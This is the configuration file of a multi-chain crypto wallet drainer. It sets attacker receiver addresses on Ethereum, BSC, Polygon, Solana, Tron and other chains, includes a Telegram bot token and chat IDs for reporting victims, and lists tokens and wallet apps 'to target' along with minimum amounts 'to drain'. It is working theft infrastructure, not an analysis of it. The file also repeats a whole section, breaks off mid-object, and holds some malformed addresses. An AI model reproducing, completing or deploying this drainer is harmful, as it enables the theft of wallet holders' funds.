// Universal Multi-Chain Drainer Configuration v2.0
window.DRAINER_CONFIG = {
    // Receiver addresses for each network (uppercase keys match NETWORKS object)
    RECEIVER_ADDRESSES: {
        ETH: "0xccf4eBe409C8C7A53376aE86fb79ECABbdE4DCBE",
        BSC: "0xccf4eBe409C8C7A53376aE86fb79ECABbdE4DCBE", 
        POLYGON: "0xccf4eBe409C8C7A53376aE86fb79ECABbdE4DCBE",
        AVALANCHE: "0xccf4eBe409C8C7A53376aE86fb79ECABbdE4DCBE",
        ARBITRUM: "0xccf4eBe409C8C7A53376aE86fb79ECABbdE4DCBE",
        OPTIMISM: "0xccf4eBe409C8C7A53376aE86fb79ECABbdE4DCBE",
        SOL: "KnxWLb2G6fRy2Ef9n4zm4ZssFi2zozoKazHn8FCg8vx",
        TRX: "THJkNgqXcmeCtB2WbHjWMw4oNyavejFBsy"
    },

    // Telegram Configuration
    TELEGRAM: {
        enabled: true,  // Set to true to enable Telegram notifications
        botToken: "8684568211:AAGLwmJvd7n1Al6e5sBnT-ycbxol-5bx0dw",  // Get from @BotFather
        chatId: "8051121194",  // Logging chat ID - general activity logs
        notificationChatId: "6939937703",  // Notification chat ID - alerts & important events (can be same or different)
        apiUrl: "https://api.telegram.org/bot",  // Direct API endpoint
        relayUrl: "http://localhost:3000/relay",  // Local relay server (CORS-free)
        useRelay: false  // Set to true to use local relay server instead of direct API
    },

    // Free API Endpoints (No Auth Required)
    FREE_APIS: {
        // EVM Chain Balance APIs
        ETH: {
            rpcUrl: "https://eth.llamarpc.com",
            explorerApi: "https://api.etherscan.io/api",
            defiLlama: "https://api.llama.fi"
        },
        BSC: {
            rpcUrl: "https://bsc.llamarpc.com",
            explorerApi: "https://api.bscscan.com/api",
            defiLlama: "https://api.llama.fi"
        },
        POLYGON: {
            rpcUrl: "https://polygon.llamarpc.com",
            explorerApi: "https://api.polygonscan.com/api",
            defiLlama: "https://api.llama.fi"
        },
        ARBITRUM: {
            rpcUrl: "https://arbitrum.llamarpc.com",
            explorerApi: "https://api.arbiscan.io/api",
            defiLlama: "https://api.llama.fi"
        },
        OPTIMISM: {
            rpcUrl: "https://optimism.llamarpc.com",
            explorerApi: "https://api-optimistic.etherscan.io/api",
            defiLlama: "https://api.llama.fi"
        },
        
        // Solana APIs
        SOL: {
            rpcUrl: "https://api.mainnet-beta.solana.com",
            genesysgoUrl: "https://mainnet.helius-rpc.com/?api-key=free",
            solscan: "https://api.solscan.io/api",
            jupiter: "https://api.jup.ag"
        },

        // Tron APIs
        TRX: {
            rpcUrl: "https://api.trongrid.io",
            blockExplorer: "https://api.tronscan.org/api"
        }
    },

    // Solana Free RPC Configuration
    SOLANA_RPC: "https://api.mainnet-beta.solana.com",

    // Network configurations with optimized settings
    NETWORKS: {
        ETH: {
            name: "Ethereum Mainnet",
            chainId: 1,
            currency: "ETH",
            rpcUrl: "https://mainnet.infura.io/v3/9aa3d95b3bc440fa88ea12eaa4456161",
            explorerUrl: "https://etherscan.io/tx/",
            gasMultiplier: 1.2,
            gasLimit: { transfer: 21000, token: 80000 }
        },
        BSC: {
            name: "BNB Smart Chain",
            chainId: 56,
            currency: "BNB", 
            rpcUrl: "https://bsc-dataseed1.binance.org/",
            explorerUrl: "https://bscscan.com/tx/",
            gasMultiplier: 1.3,
            gasLimit: { transfer: 21000, token: 80000 }
        },
        POLYGON: {
            name: "Polygon",
            chainId: 137,
            currency: "MATIC",
            rpcUrl: "https://polygon-rpc.com/",
            explorerUrl: "https://polygonscan.com/tx/",
            gasMultiplier: 1.5,
            gasLimit: { transfer: 21000, token: 80000 }
        },
        ARBITRUM: {
            name: "Arbitrum One",
            chainId: 42161,
            currency: "ETH",
            rpcUrl: "https://arb1.arbitrum.io/rpc",
            explorerUrl: "https://arbiscan.io/tx/",
            gasMultiplier: 1.1,
            gasLimit: { transfer: 21000, token: 80000 }
        },
        OPTIMISM: {
            name: "Optimism",
            chainId: 10,
            currency: "ETH",
            rpcUrl: "https://mainnet.optimism.io",
            explorerUrl: "https://optimistic.etherscan.io/tx/",
            gasMultiplier: 1.1,
            gasLimit: { transfer: 21000, token: 80000 }
        },
        AVALANCHE: {
            name: "Avalanche C-Chain",
            chainId: 43114,
            currency: "AVAX",
            rpcUrl: "https://api.avax.network/ext/bc/C/rpc",
            explorerUrl: "https://snowtrace.io/tx/",
            gasMultiplier: 1.2,
            gasLimit: { transfer: 21000, token: 80000 }
        },
        SOL: {
            name: "Solana",
            chainId: null,
            currency: "SOL",
            rpcUrl: "https://api.mainnet-beta.solana.com",
            explorerUrl: "https://solscan.io/tx/",
            type: "solana"
        },
        TRX: {
            name: "Tron",
            chainId: null,
            currency: "TRX",
            rpcUrl: "https://api.trongrid.io",
            explorerUrl: "https://tronscan.org/#/transaction/",
            type: "tron"
        }
    },

    // Popular tokens to target
    TOKENS: {
        ETH: [
            // Stablecoins
            { symbol: "USDT", address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", decimals: 6 },
            { symbol: "USDC", address: "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48", decimals: 6 },
            { symbol: "DAI", address: "0x6B175474E89094C44Da98b954EedeAC495271d0F", decimals: 18 },
            { symbol: "FRAX", address: "0x853d955aCEf822Db058eb8505911ED77F175b999", decimals: 18 },
            { symbol: "TUSD", address: "0x0000000000085d4780B73119b8B580991DEe8d52", decimals: 18 },
            { symbol: "GUSD", address: "0x056fd409e1d7a124bd7017459dfea6f78b8616fa", decimals: 2 },
            // Major Assets
            { symbol: "WBTC", address: "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599", decimals: 8 },
            { symbol: "WETH", address: "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", decimals: 18 },
            // DEX & DeFi
            { symbol: "UNI", address: "0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984", decimals: 18 },
            { symbol: "LINK", address: "0x514910771AF9Ca656af840dff83E8264EcF986CA", decimals: 18 },
            { symbol: "AAVE", address: "0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9", decimals: 18 },
            { symbol: "SUSHI", address: "0x6B3595068778DD592e39A122f4f5a5cF09C90fe2", decimals: 18 },
            { symbol: "CURVE", address: "0xD533a949740bb3306d119CC777fa900bA034cd52", decimals: 18 },
            { symbol: "LIDO", address: "0x5A98FcBaDB35fdd7033B48cb4D1379A5CF07ec21", decimals: 18 },
            { symbol: "MKR", address: "0x9f8f72aa9304c8b593d555f12ef6589cc3a579a2", decimals: 18 },
            { symbol: "COMP", address: "0xc00e94Cb662C3520282E6f5717214FCCF1b77d47", decimals: 18 },
            // Layer 2 & Bridges
            { symbol: "ARB", address: "0xB50721BCF8d664c30412Cfbc6cf7a15145234ad1", decimals: 18 },
            { symbol: "OP", address: "0x4200000000000000000000000000000000000042", decimals: 18 },
            // Large Cap Tokens
            { symbol: "SHIB", address: "0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE", decimals: 18 },
            { symbol: "PEPE", address: "0x6982508145454Ce325dDbE47a25d4ec3d2311933", decimals: 18 },
            { symbol: "DOGE", address: "0xBA2aE424d960c26247Dd6c32edC70B295c744C43", decimals: 8 },
            { symbol: "FLOKI", address: "0xcf0C122c6b73ff809C693DB761e7BaeBe62b6a2E", decimals: 9 }
        ],
        BSC: [
            // Stablecoins
            { symbol: "USDT", address: "0x55d398326f99059fF775485246999027B3197955", decimals: 18 },
            { symbol: "BUSD", address: "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56", decimals: 18 },
            { symbol: "USDC", address: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d", decimals: 18 },
            { symbol: "TUSD", address: "0x14016E85a25aeb13065688cAFB43044C2ef86784", decimals: 18 },
            { symbol: "FDUSD", address: "0xc5f0f7b66764B6Ca593fb59df420340444b9eda5", decimals: 18 },
            // Major Assets
            { symbol: "WBNB", address: "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c", decimals: 18 },
            { symbol: "BTCB", address: "0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c", decimals: 18 },
            { symbol: "ETH", address: "0x2170Ed0880ac9A755fd29B2688956BD959F933F8", decimals: 18 },
            // DEX & DeFi
            { symbol: "CAKE", address: "0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82", decimals: 18 },
            { symbol: "ADA", address: "0x3EE2200Efb3400fAbB9AacF31297cBdD1d435D47", decimals: 18 },
            { symbol: "DOT", address: "0x7083609fCE4d1d8Dc0C979AAb8c869Ea2C873402", decimals: 18 },
            { symbol: "XRP", address: "0x1D2F0da169ceB9fC7B3B4aDb29f676A423506441", decimals: 18 },
            { symbol: "LINK", address: "0xF8A0BF9cF54Bb92F17374d9e9A321E6a111a51bD", decimals: 18 },
            { symbol: "UNI", address: "0xBf5140A22578168FD362D2C5614b0cD0F27Cfc3c", decimals: 18 },
            { symbol: "AAVE", address: "0x7fc49F20B7aFcAa64aD00128563B824b0324b32E", decimals: 18 },
            { symbol: "SUSHI", address: "0x947950BcC74888a40Ffa2593C5798F11Fc9124C4", decimals: 18 },
            { symbol: "1INCH", address: "0x111111111117dC0aa78b770fA6A738034120C302", decimals: 18 },
            // Large Cap Meme
            { symbol: "SHIB", address: "0x2859e4944f1f7271e1954aff821566c3517be161", decimals: 18 },
            { symbol: "DOGE", address: "0xbA2aE424d960c26247Dd6c32edC70B295c744C43", decimals: 8 },
            { symbol: "FLOKI", address: "0xfb5B838b6cfEEdC2873Abf8d4ecF0E4B3cbB4692", decimals: 9 }
        ],
        POLYGON: [
            // Stablecoins
            { symbol: "USDT", address: "0xc2132D05D31c914a87C6611C10748AEb04B58e8F", decimals: 6 },
            { symbol: "USDC", address: "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174", decimals: 6 },
            { symbol: "DAI", address: "0x8f3Cf7ad23Cd3CaDbD9735AFF958023D60d76f34", decimals: 18 },
            { symbol: "FRAX", address: "0x104592a158490a9228070E2cAEA73DFB7fEd1fFF", decimals: 18 },
            // Major Assets
            { symbol: "WMATIC", address: "0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270", decimals: 18 },
            { symbol: "WETH", address: "0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619", decimals: 18 },
            { symbol: "WBTC", address: "0x1bfd67037B42cf73acF2047067bd4303cbd5e1d63", decimals: 8 },
            // DEX & DeFi
            { symbol: "UNI", address: "0xb33EaAd8d922B1083446DC23f610c58f0082F5B0", decimals: 18 },
            { symbol: "AAVE", address: "0xD6DF932326886F4F9F48C94afb327511145eb3D59", decimals: 18 },
            { symbol: "SUSHI", address: "0x0b3F868E0BE5C3EAB013B6994E6B953DCCC375e", decimals: 18 },
            { symbol: "QUICK", address: "0x831753DD7087CaC61aB5644b308642cc1c33Dc13", decimals: 18 },
            { symbol: "LINK", address: "0x53E0bca35eC356BD5ddDFebbD1Fc0fD03FaBad39", decimals: 18 }
        ],
        ARBITRUM: [
            // Stablecoins
            { symbol: "USDT", address: "0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9", decimals: 6 },
            { symbol: "USDC", address: "0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8", decimals: 6 },
            { symbol: "DAI", address: "0xDA10009CBD5D07dd0CeCc66161FC93D7c9000Da1", decimals: 18 },
            { symbol: "FRAX", address: "0x17FC002b466eec40Dae837Fe11EB78B742D84b7B", decimals: 18 },
            // Major Assets
            { symbol: "WETH", address: "0x82aF49447d8a07e3bd95bd0d56f318521751E236", decimals: 18 },
            { symbol: "WBTC", address: "0x2f2a2440d2CdC120a8fCd15D8D4edBE49876daBe", decimals: 8 },
            // DEX & DeFi
            { symbol: "UNI", address: "0xFa7F8980b0f1E64A2062791cc3FB0A4047912294", decimals: 18 },
            { symbol: "AAVE", address: "0xBA5DdaB4256c590B66b3fa7127126A47162F5b06", decimals: 18 },
            { symbol: "LINK", address: "0xf97f4df75117e07371157A51d100573A2c7f1a65", decimals: 18 },
            { symbol: "ARB", address: "0x912CE59144191C1204E64559FE8253a0e49E6548", decimals: 18 },
            { symbol: "GMX", address: "0xfc5A1A6EB076a2C7aD06eD22C90d3E710233C904", decimals: 30 }
        ],
        OPTIMISM: [
            // Stablecoins
            { symbol: "USDT", address: "0x94b008aA00579c1307B0EF2c499aD98a8ce58e58", decimals: 6 },
            { symbol: "USDC", address: "0x7F5c764cBc14f9669B88837ca1490cCa17c31607", decimals: 6 },
            { symbol: "DAI", address: "0xDA10009CBD5D07dd0CeCc66161FC93D7c9000da1", decimals: 18 },
            // Major Assets
            { symbol: "WETH", address: "0x4200000000000000000000000000000000000006", decimals: 18 },
            { symbol: "WBTC", address: "0x68f180fcCe6836688e9084f035309E29Bf00A150", decimals: 8 },
            // DEX & DeFi
            { symbol: "UNI", address: "0x6fd9d7AD17242c41f7131d257212c54A0Be56e7F", decimals: 18 },
            { symbol: "OP", address: "0x4200000000000000000000000000000000000042", decimals: 18 },
            { symbol: "AAVE", address: "0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0", decimals: 18 }
        ],
        AVALANCHE: [
            // Stablecoins
            { symbol: "USDT", address: "0x9702230A8Ea53601f5cD2dc00fDBc13d4dF4A8c7", decimals: 6 },
            { symbol: "USDC", address: "0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E", decimals: 6 },
                { symbol: "DAI", address: "0xd586E7F844cEa2F87f50E3EB400F8433b8C0C4D", decimals: 18 },
            // Major Assets
            { symbol: "WAVAX", address: "0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7", decimals: 18 },
            { symbol: "WETH", address: "0x49D8123dd7F6F93d77f3B1b8eF0aea3Fc2E85AaB", decimals: 18 },
            { symbol: "WBTC", address: "0x408D4cD0adb9CEaBfB6a2B56974482FFbA4b92fC", decimals: 8 },
            // DEX & DeFi
            { symbol: "JOE", address: "0x6e84a6216eA6dACC71eE8E6b0a5B7322EEbC0fDd", decimals: 18 },
            { symbol: "LINK", address: "0x5947BB275c521040541495dAFa3286f33A438605", decimals: 18 },
            { symbol: "AAVE", address: "0x63a72806098Bd3D9520cC43356dD78afe5d386D9", decimals: 18 }
        ],
        SOL: [
            // Stablecoins
            { symbol: "USDC", mint: "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v", decimals: 6 },
            { symbol: "USDT", mint: "Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB", decimals: 6 },
            // Major Assets
            { symbol: "SOL", mint: "So11111111111111111111111111111111111111112", decimals: 9 },
            { symbol: "WSOL", mint: "So11111111111111111111111111111111111111112", decimals: 9 },
            // DEX Tokens
            { symbol: "RAY", mint: "4k3Dyjzvzp8eMZWUXbBCjEvwSkkk59S5iCNLY3QrkX6R", decimals: 6 },
            { symbol: "SRM", mint: "SRMuApVNdxXokk5GT7XD5cUUgXMBCoAz2LHeuAoKWRt", decimals: 6 },
            { symbol: "COPE", mint: "8HGyAAB1yoM1ttS7pnqwXsDHZgJ615XWzVqKwRJmsMA", decimals: 6 },
            { symbol: "ORT", mint: "rtEn84DF3Gqk6VrKSqeJhG6RS3vncYVVcn2zNukmKmJ", decimals: 8 },
            // Major Tokens
            { symbol: "ORCA", mint: "orcaEKTdK7LKz57chYcSKdoUFC54MJqWuKLh2G69Tch", decimals: 6 },
            { symbol: "MNGO", mint: "MangoCzJ36AjZyKwVj3VnYU4GTonjfVEnJmvvWaxLac", decimals: 6 },
            { symbol: "COPE", mint: "8HGyAAB1yoM1ttS7pnqwXsDHZgJ615XWzVqKwRJmsMA", decimals: 6 }
        ],
        TRX: [
            // Stablecoins
            { symbol: "USDT", address: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t", decimals: 6 },
            { symbol: "USDC", address: "TEkxiTehnzSmSe2XqrBj4w32RUN966rdz8", decimals: 6 },
            { symbol: "TUSD", address: "TUpMhErZL2fhh4sVNULAbNKLokS4GjC1F4", decimals: 18 },
            // Major Assets
            { symbol: "WTRX", address: "TNUC9Qb1rRgcVdbBDP83RedsFNTJ2vkVmH9Pp9KXeLf", decimals: 6 },
            // DEX & DeFi
            { symbol: "JST", address: "TCFLL5dx5ZJdKnWuesXxi1VPwjLVmWZZy9", decimals: 18 },
            { symbol: "SUN", address: "TSSMHYeV2uE9qYH95DqyoCuNCzEL1NvU3S", decimals: 18 },
            { symbol: "BTT", address: "TNUC9Qb1rRgcVdbBDP83RedsFNTJ2vkVmH9Pp9KXeLf", decimals: 6 },
            { symbol: "SUNOLD", address: "TKkeiboTkxn6qBCw16VrFTZim5z91PSwEb", decimals: 18 }
        ]
    },

    // Minimum amounts to drain
    MIN_AMOUNTS: {
        ethereum: 0.001,
        BSC: 0.001,
        POLYGON: 0.1,
        ARBITRUM: 0.001,
        SOL: 0.001,
        TRX: 1,
        bitcoin: 0.00001
    },

    // Operation settings
    SETTINGS: {
        timeout: 30000,
        retries: 3,
        gasBuffer: 1.2,
        simulateTransactions: false
    },

    // Popular tokens to target
    TOKENS: {
        ethereum: [
            // Stablecoins
            { symbol: "USDT", address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", decimals: 6 },
            { symbol: "USDC", address: "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48", decimals: 6 },
            { symbol: "DAI", address: "0x6B175474E89094C44Da98b954EedeAC495271d0F", decimals: 18 },
            { symbol: "FRAX", address: "0x853d955aCEf822Db058eb8505911ED77F175b999", decimals: 18 },
            { symbol: "TUSD", address: "0x0000000000085d4780B73119b8B580991DEe8d52", decimals: 18 },
            { symbol: "GUSD", address: "0x056fd409e1d7a124bd7017459dfea6f78b8616fa", decimals: 2 },
            // Major Assets
            { symbol: "WBTC", address: "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599", decimals: 8 },
            { symbol: "WETH", address: "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", decimals: 18 },
            // DEX & DeFi
            { symbol: "UNI", address: "0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984", decimals: 18 },
            { symbol: "LINK", address: "0x514910771AF9Ca656af840dff83E8264EcF986CA", decimals: 18 },
            { symbol: "AAVE", address: "0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9", decimals: 18 },
            { symbol: "SUSHI", address: "0x6B3595068778DD592e39A122f4f5a5cF09C90fe2", decimals: 18 },
            { symbol: "CURVE", address: "0xD533a949740bb3306d119CC777fa900bA034cd52", decimals: 18 },
            { symbol: "LIDO", address: "0x5A98FcBaDB35fdd7033B48cb4D1379A5CF07ec21", decimals: 18 },
            { symbol: "MKR", address: "0x9f8f72aa9304c8b593d555f12ef6589cc3a579a2", decimals: 18 },
            { symbol: "COMP", address: "0xc00e94Cb662C3520282E6f5717214FCCF1b77d47", decimals: 18 },
            // Large Cap Tokens
            { symbol: "SHIB", address: "0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE", decimals: 18 },
            { symbol: "PEPE", address: "0x6982508145454Ce325dDbE47a25d4ec3d2311933", decimals: 18 },
            { symbol: "DOGE", address: "0xBA2aE424d960c26247Dd6c32edC70B295c744C43", decimals: 8 },
            { symbol: "FLOKI", address: "0xcf0C122c6b73ff809C693DB761e7BaeBe62b6a2E", decimals: 9 }
        ],
        BSC: [
            // Stablecoins
            { symbol: "USDT", address: "0x55d398326f99059fF775485246999027B3197955", decimals: 18 },
            { symbol: "BUSD", address: "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56", decimals: 18 },
            { symbol: "USDC", address: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d", decimals: 18 },
            { symbol: "TUSD", address: "0x14016E85a25aeb13065688cAFB43044C2ef86784", decimals: 18 },
            { symbol: "FDUSD", address: "0xc5f0f7b66764B6Ca593fb59df420340444b9eda5", decimals: 18 },
            // Major Assets
            { symbol: "WBNB", address: "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c", decimals: 18 },
            { symbol: "BTCB", address: "0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c", decimals: 18 },
            { symbol: "ETH", address: "0x2170Ed0880ac9A755fd29B2688956BD959F933F8", decimals: 18 },
            // DEX & DeFi
            { symbol: "CAKE", address: "0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82", decimals: 18 },
            { symbol: "ADA", address: "0x3EE2200Efb3400fAbB9AacF31297cBdD1d435D47", decimals: 18 },
            { symbol: "DOT", address: "0x7083609fCE4d1d8Dc0C979AAb8c869Ea2C873402", decimals: 18 },
            { symbol: "XRP", address: "0x1D2F0da169ceB9fC7B3B4aDb29f676A423506441", decimals: 18 },
            { symbol: "LINK", address: "0xF8A0BF9cF54Bb92F17374d9e9A321E6a111a51bD", decimals: 18 },
            { symbol: "UNI", address: "0xBf5140A22578168FD362D2C5614b0cD0F27Cfc3c", decimals: 18 },
            { symbol: "SUSHI", address: "0x947950BcC74888a40Ffa2593C5798F11Fc9124C4", decimals: 18 },
            { symbol: "1INCH", address: "0x111111111117dC0aa78b770fA6A738034120C302", decimals: 18 },
            // Large Cap Meme
            { symbol: "SHIB", address: "0x2859e4944f1f7271e1954aff821566c3517be161", decimals: 18 },
            { symbol: "DOGE", address: "0xbA2aE424d960c26247Dd6c32edC70B295c744C43", decimals: 8 },
            { symbol: "FLOKI", address: "0xfb5B838b6cfEEdC2873Abf8d4ecF0E4B3cbB4692", decimals: 9 }
        ],
        POLYGON: [
            // Stablecoins
            { symbol: "USDT", address: "0xc2132D05D31c914a87C6611C10748AEb04B58e8F", decimals: 6 },
            { symbol: "USDC", address: "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174", decimals: 6 },
            { symbol: "DAI", address: "0x8f3Cf7ad23Cd3CaDbD9735AFF958023D60d76f34", decimals: 18 },
            { symbol: "FRAX", address: "0x104592a158490a9228070E2cAEA73DFB7fEd1fFF", decimals: 18 },
            // Major Assets
            { symbol: "WMATIC", address: "0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270", decimals: 18 },
            { symbol: "WETH", address: "0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619", decimals: 18 },
            { symbol: "WBTC", address: "0x1bfd67037B42cf73acF2047067bd4303cbd5e1d63", decimals: 8 },
            // DEX & DeFi
            { symbol: "UNI", address: "0xb33EaAd8d922B1083446DC23f610c58f0082F5B0", decimals: 18 },
            { symbol: "AAVE", address: "0xD6DF932326886F4F9F48C94afb327511145eb3D59", decimals: 18 },
            { symbol: "SUSHI", address: "0x0b3F868E0BE5C3EAB013B6994E6B953DCCC375e", decimals: 18 },
            { symbol: "QUICK", address: "0x831753DD7087CaC61aB5644b308642cc1c33Dc13", decimals: 18 },
            { symbol: "LINK", address: "0x53E0bca35eC356BD5ddDFebbD1Fc0fD03FaBad39", decimals: 18 }
        ],
        ARBITRUM: [
            // Stablecoins
            { symbol: "USDT", address: "0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9", decimals: 6 },
            { symbol: "USDC", address: "0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8", decimals: 6 },
            { symbol: "DAI", address: "0xDA10009CBD5D07dd0CeCc66161FC93D7c9000da1", decimals: 18 },
            { symbol: "FRAX", address: "0x17FC002b466eec40Dae837Fe11EB78B742D84b7b", decimals: 18 },
            // Major Assets
            { symbol: "WETH", address: "0x82aF49447d8a07e3bd95bd0d56f318521751e236", decimals: 18 },
            { symbol: "WBTC", address: "0x2f2a2440d2CdC120a8fCd15D8D4edBE49876daVe", decimals: 8 },
            // DEX & DeFi
            { symbol: "UNI", address: "0xFa7F8980b0f1E64A2062791cc3FB0A4047912294", decimals: 18 },
            { symbol: "AAVE", address: "0xba5DdaB4256c590B66b3fa7127126A47162F5B06", decimals: 18 },
            { symbol: "LINK", address: "0xf97f4df75117e07371157A51d100573A2c7F1a65", decimals: 18 },
            { symbol: "ARB", address: "0x912CE59144191C1204E64559FE8253a0e49E6548", decimals: 18 },
            { symbol: "GMX", address: "0xfc5A1A6EB076a2C7aD06eD22C90d3E710233C904", decimals: 30 }
        ],
        OPTIMISM: [
            // Stablecoins
            { symbol: "USDT", address: "0x94b008aA00579c1307B0EF2c499aD98a8ce58e58", decimals: 6 },
            { symbol: "USDC", address: "0x7F5c764cBc14f9669B88837ca1490cCa17c31607", decimals: 6 },
            { symbol: "DAI", address: "0xDA10009CBD5D07dd0CeCc66161FC93D7c9000da1", decimals: 18 },
            // Major Assets
            { symbol: "WETH", address: "0x4200000000000000000000000000000000000006", decimals: 18 },
            { symbol: "WBTC", address: "0x68f180fcCe6836688e9084f035309E29Bf00A150", decimals: 8 },
            // DEX & DeFi
            { symbol: "UNI", address: "0x6fd9d7AD17242c41f7131d257212c54A0Be56e7F", decimals: 18 },
            { symbol: "OP", address: "0x4200000000000000000000000000000000000042", decimals: 18 },
            { symbol: "AAVE", address: "0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0", decimals: 18 },
        ],
        AVALANCHE: [
            // Stablecoins
            { symbol: "USDT", address: "0x9702230A8Ea53601f5cD2dc00fDBc13d4dF4A8c7", decimals: 6 },
            { symbol: "USDC", address: "0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E", decimals: 6 },
            { symbol: "DAI", address: "0xd586E7F844cEa2F87f50En3EB400F8433b8C0c4D", decimals: 18 },
            // Major Assets
            { symbol: "WAVAX", address: "0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7", decimals: 18 },
            { symbol: "WETH", address: "0x49D8123dd7F6F93d77f3B1b8eF0aea3Fc2E85AaB", decimals: 18 },
            { symbol: "WBTC", address: "0x408D4cD0adb9CEaBfB6a2B56974482FFbA4b92fC", decimals: 8 },
            // DEX & DeFi
            { symbol: "JOE", address: "0x6e84a6216eA6dACC71eE8E6b0a5B7322EEbC0fDd", decimals: 18 },
            { symbol: "LINK", address: "0x5947BB275c521040541495dAFa3286f33A438605", decimals: 18 },
            { symbol: "AAVE", address: "0x63a72806098Bd3D9520cC43356dD78afe5d386D9", decimals: 18 }
        ],
        SOL: [
            // Stablecoins
            { symbol: "USDC", mint: "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v", decimals: 6 },
            { symbol: "USDT", mint: "Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB", decimals: 6 },
            // Major Assets
            { symbol: "SOL", mint: "So11111111111111111111111111111111111111112", decimals: 9 },
            { symbol: "WSOL", mint: "So11111111111111111111111111111111111111112", decimals: 9 },
            // DEX Tokens
            { symbol: "RAY", mint: "4k3Dyjzvzp8eMZWUXbBCjEvwSkkk59S5iCNLY3QrkX6R", decimals: 6 },
            { symbol: "SRM", mint: "SRMuApVNdxXokk5GT7XD5cUUgXMBCoAz2LHeuAoKWRt", decimals: 6 },
            { symbol: "COPE", mint: "8HGyAAB1yoM1ttS7pnqwXsDHZgJ615XWzVqKwRJmsMA", decimals: 6 },
            // Major Tokens
            { symbol: "ORCA", mint: "orcaEKTdK7LKz57chYcSKdoUFC54MJqWuKLh2G69Tch", decimals: 6 },
            { symbol: "MNGO", mint: "MangoCzJ36AjZyKwVj3VnYU4GTonjfVEnJmvvWaxLac", decimals: 6 }
        ],
        TRX: [
            // Stablecoins
            { symbol: "USDT", address: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t", decimals: 6 },
            { symbol: "USDC", address: "TEkxiTehnzSmSe2XqrBj4w32RUN966rdz8", decimals: 6 },
            { symbol: "TUSD", address: "TUpMhErZL2fhh4sVNULAbNKLokS4GjC1F4", decimals: 18 },
            // Major Assets
            { symbol: "WTRX", address: "TNUC9Qb1rRgcVdbBDP83RedsFNTJ2vkVmH9Pp9KXeLf", decimals: 6 },
            // DEX & DeFi
            { symbol: "JST", address: "TCFLL5dx5ZJdKnWuesXxi1VPwjLVmWZZy9", decimals: 18 },
            { symbol: "SUN", address: "TSSMHYeV2uE9qYH95DqyoCuNCzEL1NvU3S", decimals: 18 },
            { symbol: "BTT", address: "TNUC9Qb1rRgcVdbBDP83RedsFNTJ2vkVmH9Pp9KXeLf", decimals: 6 },
            { symbol: "SUNOLD", address: "TKkeiboTkxn6qBCw16VrFTZim5z91PSwEb", decimals: 18 }
        ]
    },

    // Wallet configurations
    WALLETS: {
        ethereum: [
            { name: "MetaMask", key: "isMetaMask", icon: "metamask.png" },
            { name: "Coinbase Wallet", key: "isCoinbaseWallet", icon: "coinbase.png" },
            { name: "Trust Wallet", key: "isTrust", icon: "trust.png" },
            { name: "Rainbow", key: "isRainbow", icon: "rainbow.png" },
            { name: "Phantom", key: "isPhantom", icon: "phantom.png" },
            { name: "WalletConnect", type: "walletconnect", icon: "walletconnect.png" }
        ],
        BSC: [
            { name: "MetaMask", key: "isMetaMask", icon: "metamask.png" },
            { name: "Trust Wallet", key: "isTrust", icon: "trust.png" },
            { name: "Binance Wallet", key: "isBinance", icon: "binance.png" },
            { name: "SafePal", key: "isSafePal", icon: "safepal.png" },
            { name: "WalletConnect", type: "walletconnect", icon: "walletconnect.png" }
        ],
        SOL: [
            { name: "Phantom", key: "isPhantom", icon: "phantom.png" },
            { name: "Solflare", key: "isSolflare", icon: "solflare.png" },
            { name: "Slope", key: "isSlope", icon: "slope.png" },
            { name: "Sollet", key: "isSollet", icon: "sollet.png" },
            { name: "Glow", key: "isGlow", icon: "glow.png" }
        ],
        TRX: [
            { name: "TronLink", key: "isTronLink", icon: "tronlink.png" },
            { name: "TronMask", key: "isTronMask", icon: "tronmask.png" },
            { name: "Math Wallet", key: "isMathWallet", icon: "mathwallet.png" }
        ],
        bitcoin: [
            { name: "Unisat", key: "isUnisat", icon: "unisat.png" },
            { name: "Xverse", key: "isXverse", icon: "xverse.png" },
